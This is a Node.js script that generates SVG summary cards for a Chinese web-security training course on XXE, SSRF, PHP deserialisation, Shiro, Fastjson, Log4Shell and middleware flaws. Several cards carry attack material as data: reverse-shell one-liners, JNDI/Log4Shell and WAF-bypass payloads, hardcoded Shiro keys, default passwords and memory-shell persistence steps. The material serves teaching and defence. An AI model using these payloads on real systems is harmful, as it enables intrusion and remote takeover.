// Node.js script to append 20 themed SVG cards to each shoot-range chapter
// Run: node scripts/append_svg_cards.mjs
import { appendFileSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const BASE_DIR = String.raw`e:\internal_safe\cisp1\cisp\public\contents\cyber-learning\shoot-range`;

function svgCard(title, color, items) {
  const id = Math.random().toString(36).slice(2, 10);
  const cols = items.length <= 3 ? items.length : 3;
  const rows = Math.ceil(items.length / cols);
  const H = 90 + rows * 73;
  const W = 800;
  const bw = 220, bh = 55, gx = 20, gy = 18;
  const sx = 40 + ((740 - (cols * bw + (cols - 1) * gx)) / 2);
  const pal = ['#eff6ff', '#f0fdf4', '#fef3c7', '#fce7f3', '#f5f3ff', '#ecfeff', '#fef2f2', '#f0f9ff', '#faf5ff'];
  let o = `\n<svg width="${W}" height="${H}" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ${W} ${H}">\n`;
  o += `  <defs><linearGradient id="g${id}" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>\n`;
  o += `  <rect x="0" y="0" width="${W}" height="${H}" rx="12" fill="url(#g${id})"/>\n`;
  o += `  <rect x="12" y="12" width="${W - 24}" height="44" rx="8" fill="${color}" opacity="0.88"/>\n`;
  o += `  <text x="${W / 2}" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">${title}</text>\n`;
  let y = 90;
  for (let r = 0; r < rows; r++) {
    let x = sx;
    for (let c = 0; c < cols; c++) {
      const i = r * cols + c;
      if (i >= items.length) break;
      const itm = String(items[i]).replace(/[<>&]/g, s => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[s]));
      const f = pal[i % pal.length];
      o += `  <rect x="${x}" y="${y}" width="${bw}" height="${bh}" rx="10" fill="${f}" stroke="#64748b" stroke-width="2"/>\n`;
      o += `  <text x="${x + bw / 2}" y="${y + bh / 2 + 5}" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${itm}</text>\n`;
      x += bw + gx;
    }
    y += bh + gy;
  }
  o += '</svg>\n';
  return o;
}

export function buildSection(dayLabel, topics) {
  let out = '\n---\n\n';
  out += `# 🖼️ 本章拓展图解汇总（${dayLabel} · 共${topics.length}张SVG架构图）\n\n`;
  for (const t of topics) out += svgCard(t[0], t[1], t[2]);
  return out;
}

// ---------------- Topics library ----------------
export const TOPICS = {
  31: [
    ['🎯 XXE/SSRF/PHP反序列化 三大模块全景','#0e7490',['XXE XML外部实体注入','SSRF 服务端请求伪造','PHP反序列化 POP链','共同: 不信任输入 → RCE']],
    ['📚 XXE 三大文件读取姿势','#0e7490',['① 有回显 直接ENTITY','② php://filter Base64读源码','③ CDATA包装 读特殊字符','④ Blind/OOB 不出网带外']],
    ['🗺️ XXE OOB 带外攻击流程','#0e7490',['受害者XML解析','LDAP/DNS HTTP请求','攻击者VPS','接收file内容','带外成功']],
    ['🛡️ XXE 防护五大最佳实践','#166534',['禁用外部实体','禁用DTD','禁用内联DTD','用户输入白名单','禁用net扩展']],
    ['🔎 SSRF 六大攻击面','#0d9488',['URL分享','图片加载','RSS订阅','WebHook','邮件抓图','远程资源']],
    ['🛰️ SSRF 六大协议利用矩阵','#155e75',['http(s) 网页','file 本地','dict 字典/Redis','gopher Redis/MySQL','ftp 穿越','ldap JNDI']],
    ['📡 SSRF 内网探测思路','#16a34a',['127.0.0.1 本地','10网段扫描','172.16网段','192.168 C段','端口指纹','Redis/ES/Mongo']],
    ['🧱 SSRF 绕过姿势清单','#7c3aed',['localhost别名','[::] IPv6','30x跳转','短链接','DNS重绑定','@封闭字符']],
    ['📦 SSRF+Redis 写WebShell','#0369a1',['dict CONFIG SET dir','dbfilename shell.php','SET 小马内容','SAVE 持久化','访问shell.php']],
    ['🧷 Gopher 协议Redis攻击序列','#1e3a8a',['AUTH可选','CONFIG SET dir','CONFIG SET dbfilename','SET mykey 马内容','SAVE → RCE']],
    ['🛡️ SSRF 多层防御架构','#166534',['URL白名单','协议限制','禁用跳转','内网禁止','DNS静态解析','出口ACL']],
    ['🔬 PHP serialize/unserialize原理','#78350f',['对象→字符串 serialize','__sleep触发','字符串→对象 unserialize','__wakeup触发','注入POP链']],
    ['🦴 PHP 魔术方法生命周期','#92400e',['__construct 构造','__destruct 析构','__toString 转字符串','__call/__callStatic','__get/__set 访问','__invoke 调用']],
    ['🔗 POP 链构造四步法','#b45309',['① 终点 __destruct','② 中转 __call/toString','③ 起点 unserialize触发','④ 组装对象 serialize']],
    ['📦 phar:// 伪协议触发流程','#0369a1',['构造phar文件存Meta','改后缀图片上传','file_exists/stat触发','phar://读取','反序列化执行']],
    ['🧠 Session 反序列化三引擎','#7c3aed',['php 键名|竖线格式','php_binary 长度+名字','php_serialize 原生数组','ini_set切换引擎','触发条件不一致']],
    ['📖 本章知识点树状图','#0e7490',['XXE: 有回显/OOB/Blind','SSRF: 协议/绕过/Redis','PHP反序列化: 魔术方法','PHP反序列化: POP/phar']],
    ['🛠️ 本章工具矩阵清单','#0f766e',['Burp Collaborator','XXEinjector','SSRFmap','gopherus','phpggc','PHP-Serialization-RCE']],
    ['🎓 本章难度进度条','#be123c',['XXE基础 ████░░ 40%','XXE深入 ███████░ 80%','SSRF ██████░░ 60%','PHP反序列化 █████░░░ 50%']],
    ['✅ 通关自测CheckList','#166534',['读/etc/passwd成功','Blind XXE DNS请求','SSRF访问云元数据','Redis写WebShell','POP链RCE','phar://触发']],
  ],
  37: [
    ['🔥 三大Java核弹漏洞时间线','#7f1d1d',['2016 Shiro-550','2017 Fastjson 1.2.24','2019 1.2.47 Bypass','2021 Shiro-721','2021-12 Log4Shell']],
    ['⚔️ Shiro 550 / 721 对比','#0369a1',['550 硬编码AES密钥','721 Padding Oracle','共同 rememberMe Cookie','共同 Commons反序列化','升级+禁用记住我']],
    ['🔑 Shiro RememberMe 加密链路','#1e3a8a',['ysoserial生成对象','GZIP压缩字节','AES-CBC 加密','IV随机 前置拼接','Base64编码 → Cookie']],
    ['🧩 Shiro 常见硬编码密钥','#92400e',['kPH+bIxk5D2deZiIxcaaaA==','Z3VucwAAAAAAAAAAAAAAAA==','2AvVhdsgUs0FSA3SDFAdag==','4AvVhmFLUs0KTA3Kprsdag==','wGiHplamyXlVB11UXWol8g==','剩下100+见字典']],
    ['💥 Fastjson 1.2.24 JNDI链','#7c2d12',['JSON.parse(input)','@type JdbcRowSetImpl','setAutoCommit 触发lookup','LDAP/RMI加载远程类','RCE成功']],
    ['🧱 Fastjson 版本安全演进','#991b1b',['1.2.24 首发漏洞','1.2.25 AutoType默认关+黑名','1.2.42 黑名单绕过','1.2.47 Class缓存绕过','1.2.68 SafeMode加固']],
    ['🧪 JNDI 三大服务协议','#4c1d95',['RMI 1099端口经典','LDAP 389端口最通用','CORBA IIOP 穿透','JDK 8u191 远程限制','本地Factory绕过']],
    ['☠️ Log4j2 注入点大全','#b91c1c',['User-Agent','X-Forwarded-For','登录用户名','搜索关键字','URL参数','所有被log的字段']],
    ['🧨 Log4Shell Lookup变形','#991b1b',['${jndi:ldap://x}','${lower:j}${lower:n}','${${::-j}${::-n}}','${env:USER}','${sys:java.home}','${java:version}']],
    ['🛡️ 三大漏洞防御总表','#166534',['Shiro 升级1.8+ 换随机密钥','Fastjson 1.2.83+ SafeMode','Log4j2 升级 2.17.1+','JDK 8u342+ 禁用LDAP','WAF关键词黑名单','RASP Java Agent拦截']],
    ['🔍 快速检测清单','#155e75',['rememberMe=deleteMe 指纹','Server: Shiro','X-Api-Version Fastjson报错','%7Bjndi:ldap://ceye%7D','Burp被动扫描','Nuclei templates']],
    ['🧰 工具箱 Top10','#422006',['ysoserial 反序列化','marshalsec LDAP/RMI','JNDI-Injection-Exploit','JNDIExploit 1.x','ShiroScan','shiro.py','fastjson-scan','log4j2-scan','Burp被动插件','Nuclei']],
    ['🧠 Fastjson 利用链分类','#7c3aed',['JNDI远程链','TemplatesImpl本地字节码','CommonsCollections本地链','BadAttributeValueExpExcept','ROME链','SpringAOP链']],
    ['🌐 JDK版本兼容矩阵','#075985',['JDK 6/7 早期 100%','JDK 8u121 trustURLCodebase','JDK 8u191 LDAP白名单限制','TomcatEL 本地BeanFactory','Groovy 本地链']],
    ['📡 出网/半出网/不出网','#1e40af',['出网: JNDI 一键RCE','半出网: DNSLog盲探测','不出网 本地Factory','不出网 Groovy/TomcatEL','不出网 信息泄露链']],
    ['🛠️ 反弹Shell 备忘集合','#be123c',['bash -i >& /dev/tcp/ip/p 0>&1','nc -e /bin/sh ip port','python -c socket pty','Runtime.getRuntime.exec(cmd[])','ProcessBuilder(cmd[])']],
    ['🎓 本章难度与学习曲线','#7f1d1d',['Shiro-550 ███████░░ 70%','Fastjson 1.2.24 ██████░░░ 60%','Fastjson 1.2.47 █████░░░░ 50%','Shiro-721 ████░░░░░ 40%','Log4Shell ███████░░ 70%']],
    ['📚 后续学习路径分支','#0e7490',['A: CC链深挖+Java反序列化原理','B: 中间件 Weblogic/JBoss/IIS','C: 内存马+免杀+RASP对抗','D: 不出网场景深入利用']],
    ['⚠️ 常见坑点避坑指南','#92400e',['JDK版本高JNDI失效','JCE无限制策略缺失','目标内网严格不出网','Commons版本不匹配','PaddingException填充错']],
    ['✅ 通关自测CheckList','#166534',['Shiro550 key爆破命中','Fastjson 1.2.24 DNSLog成功','Fastjson 1.2.47 Bypass成功','Log4Shell 信息泄露成功','目标反弹shell成功','升级后漏洞全部失效']],
  ],
  38: [
    ['🏛️ 六大中间件漏洞全景','#7c2d12',['Apache 老牌Web','Nginx 高并发Web','Tomcat Servlet容器','IIS Windows Web','Weblogic 企业JavaEE','JBoss/WildFly 应用服']],
    ['🧊 Apache 解析漏洞家族','#92400e',['AddHandler .php 配置错','双后缀 .php.jpg 误解析','CVE-2017-15715 %0a截断','重写规则绕过','Apache 2.2 vs 2.4差异']],
    ['🌊 Nginx 解析+目录穿越','#0f766e',['path_info .php/文件解析','alias ../ 目录穿越 CVE','CVE-2013-4547 空格截断','fastcgi_split漏洞','CRLF注入响应拆分']],
    ['🐈 Tomcat 利用矩阵','#0b5394',['PUT上传 CVE-2017-12615','弱口令 manager + WAR部署','AJP Ghostcat CVE-2020-1938','/examples 样例泄露','Host Manager 弱口令']],
    ['🪟 IIS 经典解析漏洞','#164e63',['IIS 6 /xx.asp/ 目录解析','.asp;.jpg 分号截断','IIS 7.x %00 截断','短文件名 ~1 枚举','WebDAV PUT 写马']],
    ['🔒 IIS 短文件名探测原理','#0e7490',['OPTIONS *~1*/. HTTP','404 vs 400 状态差异','逐字符二分法枚举','0-9a-zA-Z长度穷举','.aspx/.asp 后缀猜测']],
    ['🪤 IIS WebDAV PUT 攻击','#0369a1',['OPTIONS确认方法支持','PROPFIND列目录权限','PUT上传 shell.txt','MOVE / COPY 重命名.asp','菜刀/蚁剑连接马']],
    ['🏰 Weblogic 端口与指纹','#7f1d1d',['7001 HTTP 默认','7002 HTTPS t3s','5556 NodeManager','7003 Managed','8453 远程调试','9002 Coherence']],
    ['💣 Weblogic 四大经典RCE','#991b1b',['CVE-2019-2725 XMLDecoder','CVE-2020-14882 Console未授权','CVE-2020-2555 T3反序列化','CVE-2021-2109 JNDI注入']],
    ['📡 CVE-2019-2725流程','#b91c1c',['/_async/AsyncResponseService','SOAP Body XMLDecoder','Class Runtime ProcessBuilder','exec("calc") 命令执行','无需登录 直接回显RCE']],
    ['🚪 CVE-2020-14882未授权','#92400e',['/console/css/%252e%252e%252fconsole.portal','双重URL编码 ../绕过','_nfpb=true&_pageLabel','加载后台页面','未授权执行任意命令']],
    ['🐂 JBoss 三大利用面','#155e75',['JMX Console 未授权','jmx-console/HtmlAdaptor','部署WAR包拿Shell','反序列化 JMXInvokerServlet','EJBInvokerServlet 反序列']],
    ['📦 JBoss WAR部署攻击','#166534',['JMX-console 未授权访问','jboss.web:service=Deployer','addURL() 加载远程WAR','JBoss自动解压部署WAR','访问 /war/shell.jsp 执行']],
    ['🛡️ 加固基线12项','#166534',['最新安全补丁 PSU','隐藏版本号Banner','禁用未用模块/端点','低权限非root启动','日志审计+WAF+RASP','Web目录只读权限']],
    ['🧰 Nuclei模板矩阵','#0f172a',['nuclei -t weblogic/','nuclei -t tomcat/','nuclei -t iis/','nuclei -t nginx/','nuclei -t apache/','nuclei -t jboss/']],
    ['🕸️ 默认口令Top10','#7c3aed',['tomcat/tomcat','admin/admin','weblogic/weblogic','root/123456','manager/manager','deployer/deployer']],
    ['📊 CVSS 分数排行榜','#be123c',['Weblogic 14882 CVSS 9.8','Tomcat AJP 1938 9.8','JBoss默认 满分 10.0','IIS 6 解析漏洞 9.3','Nginx alias 穿越 7.5']],
    ['🎯 实战利用优先级','#b45309',['P0 Weblogic Console未授权','P1 JBoss未授权WAR部署','P2 IIS6解析+任意上传','P3 Tomcat PUT/后台弱口','P4 Nginx alias 目录穿越']],
    ['🧠 面试高频问答','#0e7490',['解析漏洞根本成因?','PUT上传防护四件事?','T3协议怎么识别拦截?','Weblogic 6 项加固?','WAR部署的三个步骤?','IIS短文件名怎么防护?']],
    ['✅ 通关自测CheckList','#166534',['IIS 6 asp;.jpg 成功拿Shell','Weblogic 14882 一键RCE成功','JBoss WAR部署上线成功','Tomcat manager 弱口令成功','Nginx alias穿越读到源码','加固后漏洞全部失效']],
  ],
  40: [
    ['⚡ Fastjson 版本漏洞对应表','#7c2d12',['1.2.24 首发@type RCE','1.2.25 AutoType默认关+黑名单','1.2.41 L开头大写绕过','1.2.42 [ 数组前缀绕过','1.2.47 Class缓存绕过','1.2.68 SafeMode加固']],
    ['🧠 @type 反序列化核心原理','#92400e',['parseObject(json, Object.class)','识别 @type 全限定类名','Class.forName 动态加载类','newInstance 实例化对象','递归调用所有 setter 注入']],
    ['🔗 JdbcRowSetImpl 触发链路','#b91c1c',['@type: JdbcRowSetImpl','setDataSourceName("ldap://evil")','setAutoCommit(true) 触发','this.dataSource.getConnection()','InitialContext.lookup(ldap)']],
    ['🧪 1.2.24 三条利用链对比','#0f766e',['链1 JNDI远程链 JdbcRowSetImpl','链2 本地字节码 TemplatesImpl','链3 本地集合 PriorityQueue','链1需出网/JNDI服务','链2/3本地无需出网']],
    ['📚 TemplatesImpl 字节码原理','#0369a1',['_bytecodes: 存恶意class字节[]','_name: 非空 通过校验','_tfactory: TransformerFactory','getOutputProperties() 被调用','newTransformer() 触发 defineClass']],
    ['🧱 1.2.25 AutoType安全机制','#1e3a8a',['autoTypeSupport = false 默认关','denyList 100+ 危险类前缀','全限定名 startsWith 匹配','com.sun/org.apache 开头拦截','黑名单 vs 绕过 演化史']],
    ['🛞 1.2.47 缓存Bypass核心','#7f1d1d',['@type: java.lang.Class','val: "JdbcRowSetImpl"','TypeUtils.loadClass 加载并放入缓存','后续再次 @type JdbcRowSetImpl','缓存命中 绕过AutoType检查']],
    ['🚧 1.2.68+ SafeMode 安全架构','#166534',['safeMode=true 白模式','全局禁用 @type 自动类型','关闭AutoType功能','完全禁止任意类反序列化','性能+安全双优 推荐开启']],
    ['🎯 Fastjson 指纹识别5法','#155e75',['Header/Body 探测 set-cookie 模式','X-Api-Version 返回 Fastjson 字样','异常时 JSONException 堆栈','Accept: application/json → Content-Type匹配','Server中间件 + Content-Type']],
    ['📡 DNSLog 无回显检测Payload','#4c1d95',['{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}','{"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}','{"@type":"java.net.InetSocketAddress"{"address":,"val":"x.dns"}}']],
    ['🧰 实战工具链矩阵','#422006',['JNDI-Injection-Exploit-1.0','JNDIExploit 1.2/1.4','fastjson-scan-demo','Burp FastjsonScan 插件','nuclei fastjson templates','python3 fastjson_rce.py']],
    ['🛡️ JDK版本 vs 利用成功率','#075985',['JDK 6/7u21早期 100%成功','JDK 8u121- RMI失效 LDAP OK','JDK 8u191+ 远程码加载失效→本地链','JDK 11+ 需 Groovy/TomcatEL本地链','高版本本地链成功率下降']],
    ['🧩 CommonsBeanutils1 本地链','#7c3aed',['PriorityQueue 作为容器','BeanComparator.compare() 排序调用','TemplatesImpl.getOutputProperties()','defineClass 加载 _bytecodes','全程本地 无需目标出网']],
    ['⚔️ Fastjson 绕过史 1.2.25~1.2.80','#991b1b',['1.2.41 Lcom/xxx/YY 类路径大写绕过','1.2.42 [Lcom.xxx.YY; 数组前缀','1.2.47 java.lang.Class 缓存污染','1.2.68前 SafeMode关 仍可绕','1.2.83后 安全加固 绕法极少']],
    ['📖 报错信息回显识别','#0e7490',['syntaxError: expect 语法错','autoType is not support 被拦','not close json 引号不配对','was class java.lang.String 类型不对','cannot be cast to xxx 类转换错']],
    ['🔬 实战案例：某CMS登录口','#be123c',['某开源CMS /api/login 接口','Content-Type: application/json 提交','DNSLog盲打 → 命中 dnslog请求','JDK版本 8u171 → LDAP OK','JNDI Exploit 一键 RCE 上线']],
    ['🎚️ WAF绕过7种变形写法','#b45309',['增加多余空格/换行 JSON键值对','Unicode \\u0040 转义 @ 符号','URL编码双重编码双写','Content-Type x-www-form-urlencoded','多参数混合注入 JSON','请求体分段/压缩']],
    ['🧠 面试高频：Fastjson vs Jackson','#7c2d12',['@type vs @JsonTypeInfo','默认自动类型绑定差异','Fastjson曾维护问题+黑名单不断','Jackson 生态更稳 社区更活','两者都需最新补丁 白名单类型']],
    ['🛠️ 修复方案三级分级','#166534',['临时: WAF拦截 @type + 100+危险类','短期: safeMode=true 或升级至1.2.83+','长期: 替换为 Jackson/Gson + 显式白名单类型']],
    ['✅ Day40 通关自测CheckList','#166534',['1.2.24 JNDI探测DNSLog成功','TemplatesImpl 本地字节码RCE成功','1.2.47 Class缓存绕过成功','1.2.68 SafeMode 利用失败(正确)','WAF绕过变形Payload命中','加固后 所有Payload失效']],
  ],
  41: [
    ['🧭 Shiro 框架架构一览','#0369a1',['Subject 主体(当前用户)','SecurityManager 核心调度器','Realm 数据源(认证/授权)','SessionManager 会话管理','RememberMeManager 记住我','FilterChain 过滤器链']],
    ['🍪 RememberMe Cookie 加密全链路','#1e3a8a',['Principals Collection 序列化对象','GZIP.compress 压缩字节流','AES-CBC 模式加密','IV随机16字节 拼接密文前','Base64 编码整体 → Set-Cookie: rememberMe=...']],
    ['🔍 Shiro 指纹识别8法','#0e7490',['① rememberMe=deleteMe Cookie 响应头','② 两次 Set-Cookie rememberMe 特征','③ 401未授权 页面Shiro样式','④ shiro.ini 路径报错堆栈','⑤ /login.jsp;JSESSIONID URL风格','⑥ doFilter JS/堆栈','⑦ rememberMe=1 → 302重定向','⑧ Www-Authenticate: BASS 头']],
    ['🔑 Shiro常见硬编码密钥Top','#7f1d1d',['kPH+bIxk5D2deZiIxcaaaA==','Z3VucwAAAAAAAAAAAAAAAA==','2AvVhdsgUs0FSA3SDFAdag==','4AvVhmFLUs0KTA3Kprsdag==','wGiHplamyXlVB11UXWol8g==','剩余150+ 见 shiro_keys.txt 字典']],
    ['🧨 Shiro-550 攻击流程7步','#991b1b',['① ysoserial CB1 生成序列化恶意对象','② GZIP.compress 压缩','③ Base64解码AES密钥(128bit)','④ AES-CBC IV=零或随机 加密','⑤ IV+CIPHER 拼接 → Base64','⑥ Cookie rememberMe= 值','⑦ 服务端解密反序列化 触发RCE']],
    ['🛠️ ysoserial 三条常用链对比','#7c2d12',['链1 CommonsBeanutils1 CB1 无额外依赖','链2 CommonsCollections1 CC1 需commons-collections:3.1','链3 CommonsCollections5/6 CC兼容广','CB1适用最广 Shiro自带依赖','CC链需目标有对应 commons-collections']],
    ['🧪 手搓Python 加密脚本要点','#92400e',['base64.b64decode(key_str) → 16字节AES密钥','gzip.compress(ysoserial_bytes)','AES.new(key, AES.MODE_CBC, iv=16*b"\\x00")','pad 填充 PKCS7 至16倍数','return base64.b64encode(iv + ct_bytes).decode()']],
    ['🔐 Shiro-721 Padding Oracle 原理','#4c1d95',['CBC模式: 明文块 XOR 前一个密文块','逐字节翻转前置密文字节','观察服务端响应(302登录有效 vs 401解密失败)','Padding正确/Invalid 两种反馈','逐块恢复明文或伪造任意密文块']],
    ['🧰 Shiro 工具链全家桶','#422006',['经典 shiro.py 脚本','ShiroScan Burp 插件(一键检测+利用)','shiro_key_爆破字典.txt 200+密钥','ShiroExploit GUI图形化工具','ShiroAttack2 批量扫描','Nuclei: http/shiro-detect templates']],
    ['🧱 CB1 vs CommonsCollections 差异','#0f172a',['CB1: 依赖 Shiro 自带 commons-beanutils','CB1: 兼容 Shiro 1.2~1.7 绝大多数版本','CC1: 需 commons-collections 3.1 老版本','CC5/CC6: LazyMap+TiedMapEntry 组合','CC6: 兼容 commons-collections 3.2.1']],
    ['📐 Cookie 长度与AES块关系','#075985',['AES 块大小固定 16字节','不足 PKCS7 自动补齐','序列化+GZIP 结果越大 Cookie越长','rememberMe 正常长度 400~1800字符','异常超长/短 = 可疑失败回显信号']],
    ['📈 Shiro版本 vs 利用成功率','#be123c',['Shiro 1.2.4: CB1链 100% 成功','Shiro 1.3.2: 550仍有效 几乎100%','Shiro 1.4.1: 550有效 约95%','Shiro 1.4.2+: 开始修复550 降至40%','Shiro 1.8.0+: 550修复 721仍可能(约30%)']],
    ['🧩 内存马 + Shiro-550 进阶组合','#7c3aed',['① Spring MVC Controller 内存马','② Filter 过滤器内存马','③ ServletContextListener 监听器马','④ Tomcat Valve 内存马','⑤ WebSocket 内存马 隐蔽型']],
    ['🌐 出网 vs 不出网 利用矩阵','#0e7490',['出网: DNS探测 + JNDI RCE + 上线','半出网: DNSLog盲探测版本/组件','不出网: CB1 纯本地反序列化','不出网 + echo: RCE 回显命令结果','不出网 + 内存马: 永久后门']],
    ['🛡️ Shiro 安全加固5件套','#166534',['① 升级 Shiro 至 1.12.0+ 最新版','② 替换密钥为 SecureRandom 64位随机 Base64','③ rememberMe=false 全局禁用记住我','④ JSESSIONID Cookie: HttpOnly + Secure + SameSite','⑤ 禁用JMX远程管理 + 拦截 T3/IIOP 端口']],
    ['🧠 面试：为什么漏洞叫Shiro-550？','#92400e',['Shiro项目 JIRA Issue 编号 SHIRO-550','2016年公开 CVE-2016-4437','核心问题: AES加密密钥是硬编码写死在代码','攻击者知道密钥→可构造任意Cookie','反序列化 CB1/CC链 → 服务器RCE']],
    ['🎯 实战：SpringBoot+Shiro 打靶','#b91c1c',['① 访问 /login → 响应 rememberMe=deleteMe 指纹命中','② 加载 ShiroScan → 自动爆破100+密钥 → 成功命中','③ ShiroScan 自动选择 CB1链 → 发送请求','④ 目标服务器 nc -lvvp 接收到反弹shell 上线','⑤ 后续迁移CS/哥斯拉内存马 持久化']],
    ['⚠️ 常见报错与排查8条','#1e40af',['javax.crypto.BadPaddingException → 密钥错/IV错','Illegal key size → JDK未装JCE无限制策略','ClassNotFound CB1 → 目标不含beanutils','Length 15 not 16 → Base64解码异常','NoSuchAlgorithm: AES/GCM → JDK加密包损坏']],
    ['📚 下一步深挖路线','#166534',['① ysoserial 源码阅读 每条链手工推导','② CommonsCollections 原理 手写LazyMap','③ Java Instrument + Agent 内存马原理','④ RASP 拦截原理 + 对抗绕过','⑤ JEP 290 序列化白名单过滤 配置']],
    ['✅ Day41 通关自测CheckList','#166534',['Shiro指纹识别 8种方法 全掌握','Key字典爆破 Vulhub Shiro靶机 命中','ysoserial CB1 Python手工加密 成功','ShiroScan 一键检测+利用 成功','Shiro-721 Padding Oracle原理 能讲清','加固后550/721均失效 验证成功']],
  ],
  42: [
    ['💥 Log4Shell 核弹漏洞全景图','#991b1b',['CVE-2021-44228 Log4j2 2.0-beta9~2.14.1','CVE-2021-45046 二次绕过 2.15','CVE-2021-45105 DoS 2.16','CVE-2021-44832 JDBC RCE 2.17','JNDI Lookup注入 → 全行业核弹级影响']],
    ['🔍 Log4j2 日志输出链路','#7c2d12',['应用代码: log.info(userInput)','PatternLayout %msg 解析','StrSubstitutor 替换 ${...}','JndiLookup.lookup() 触发','InitialContext.lookup(jndiUrl)']],
    ['🧪 ${} Lookup 变形写法矩阵','#b91c1c',['${jndi:ldap://x}','${lower:j}${lower:n}${lower:d}${lower:i}','${${::-j}${::-n}${::-d}${::-i}}','${jndi:${lower:l}dap://x}','${env:USER} 泄露环境变量','${sys:java.home} 系统属性']],
    ['🎯 常见注入点位置 Top10','#be123c',['URL 参数 /?q=${jndi}','User-Agent 请求头','X-Forwarded-For 真实IP','Referer 来源页','登录表单 username 字段','搜索关键字 search 参数','Cookie 自定义值','POST Body JSON 任意字段','Accept-Language 语言头','所有进入 log.info/error() 的输入']],
    ['🧰 JNDIExploit 工具功能矩阵','#4c1d95',['LDAP服务 1389端口','HTTP服务 8080 恶意class','RMI服务 1099端口','BasicInfo 泄露环境变量','ByPassJDK8u191 TomcatEL','SpringMVC内存马注入','Tomcat Listener内存马','Websphere 绕过链 + Resin利用']],
    ['📊 JDK版本 vs 利用成功率','#075985',['JDK 6/7 早期: 出网100% 成功','JDK 8u121-: RMI trustURLCodebase=false','JDK 8u191+: LDAP 远程ObjectFactory白名单','高版本 JDK → 本地BeanFactory/TomcatEL绕过','JDK 11+ → 依赖Groovy/Spring Boot 本地链']],
    ['🛞 Log4j2 三条利用链对比','#92400e',['链1 JNDI远程链: 出网+低JDK 最通用','链2 JDBC RCE: 2.17 CVE-2021-44832','链3 RASP绕过: 反序列化 纯本地链','链4 XXE: 已修复版 少见 信息泄露']],
    ['🐱‍💻 信息泄露探测 (不出网 必用)','#0e7490',['${java:version} → JDK版本号','${java:runtime} → JRE详细版本','${env:USER} → 系统用户名','${env:PATH} → 系统PATH环境','${sys:user.home} → 家目录','${sys:user.dir} → 当前工作目录','${sys:os.name} → 操作系统名','${log4j:configLocation} → 配置文件路径']],
    ['🚧 WAF绕过8大变形姿势','#b45309',['① 大小写混合 ${JNDI:LDAP}','② ${lower:j} 拆分拼接','③ ${::-j} 空替换绕过','④ Unicode转义 \\u0024\\u007b','⑤ URL双重编码 %2524%257b','⑥ 嵌套多层 ${${a:-j}ndi}','⑦ 多余空格换行干扰','⑧ Content-Type/多参数混合注入']],
    ['🏗️ JNDI注入全链路示意图','#7c2d12',['Step1: 目标服务 log.info() 用户输入','Step2: StrSubstitutor 解析 ${jndi:ldap://evil}','Step3: JndiLookup → InitialContext.lookup()','Step4: 目标发LDAP请求到攻击者VPS','Step5: LDAP返回 Reference 含 http://evil/Exp.class','Step6: JDK去HTTP下载Exp.class字节码','Step7: defineClass + newInstance() 实例化','Step8: 恶意类static代码块执行 → RCE']],
    ['🔐 Log4j2 修复版本差异表','#166534',['2.15.0-rc1 初修 仍有绕过 不推荐','2.15.0 正式 修CVE-44228 仍有45046','2.16.0 禁JNDI 禁用MessageLookup 仍有45105','2.17.0 修45105 DoS 仍有44832','2.17.1 修44832 JDBC RCE → 推荐最终版','2.17.2+ Java 8/11+ 长期稳定']],
    ['🛡️ 加固方案 7件套','#166534',['① 升级 log4j-core 至 2.17.1 (2.17.2+)','② JVM参数: -Dlog4j2.formatMsgNoLookups=true (仅旧版)','③ 系统环境: LOG4J_FORMAT_MSG_NO_LOOKUPS=true','④ 移除 JndiLookup.class 类: zip -q -d log4j-core*.jar','⑤ WAF规则: 拦截 ${jndi: ${lower: ${::-j}','⑥ RASP Agent 拦截: JndiLookup / InitialContext.lookup','⑦ 出口防火墙: 禁止服务器主动出网LDAP/RMI/HTTP非白名单']],
    ['📡 扫描检测工具 全家桶','#0f172a',['log4j2-scan (logpresso) 本地jar扫描','Burp Log4jScanner 插件 主动+被动','Nuclei templates/cves/2021/CVE-2021-44228','log4j-scan.py (fullhunt.io) 批量','JNDIExploit-1.3-SNAPSHOT.jar 利用端','GitHub 全网扫描 仓库公开名单']],
    ['🧱 CVE-2021-44832 JDBC RCE链','#4c1d95',['影响版本: 2.0-beta7 ~ 2.17.0 (不含2.17.1)','前提: 攻击者可控log4j2.xml配置文件','AppenderType=JDBC + dataSource JNDI','恶意JDBC URL: jdbc:h2:mem:;MODE=MSSQLServer;...','INIT=CREATE ALIAS SHELLEXEC AS ~//~  → RCE','h2 内存数据库 + 自定义 alias → 任意命令执行']],
    ['⚡ 实战SpringBoot+Log4j2案例','#1e40af',['① 靶机: vulhub/log4j CVE-2021-44228 8080端口','② 注入点: /solr/admin/cores?action= 参数','③ DNSLog盲打: ${jndi:dns://xxx.dnslog.cn/name} → 命中','④ JNDIExploit启动: java -jar JNDIExploit.jar -i VPS_IP','⑤ Payload: ${jndi:ldap://VPS:1389/Basic/Command/Base64/xxx}','⑥ 目标: Base64反弹bash编码命令 成功上线CS']],
    ['🧠 面试：为什么Log4j2能打穿几乎全行业？','#0e7490',['① Java生态占比高: 企业服务90%用Java','② Log4j2几乎是Java项目标配日志组件','③ 漏洞触发极其简单: 任何可被记录日志的用户输入','④ Lookup机制默认开启 无任何权限校验','⑤ 影响面广: SpringBoot/Apache/Minecraft/苹果iCloud/Steam全中招','⑥ 历史上最严重漏洞之一: CVSS 10.0 满分']],
    ['📚 Log4j2 核心组件架构','#0369a1',['Logger: 应用代码调用入口','LoggerConfig: 日志级别/过滤器/Appender引用','Appender: 日志输出位置 Console/File/JDBC','Layout: 日志格式 PatternLayout/jsonTemplate','Lookup: 变量替换 ${} 解析器(核心漏洞点)','StrSubstitutor: ${} 实际执行替换']],
    ['⚠️ 常见报错与排查','#92400e',['javax.naming.CommunicationException → 目标内网不出网 或防火墙拦截','javax.naming.NamingException → LDAP服务未启动 端口错','ClassNotFoundException → 远程class路径错','NoClassDefFoundError: org/apache/logging/log4j → 版本不匹配','BadAttributeValueExpException → 反序列化链不兼容']],
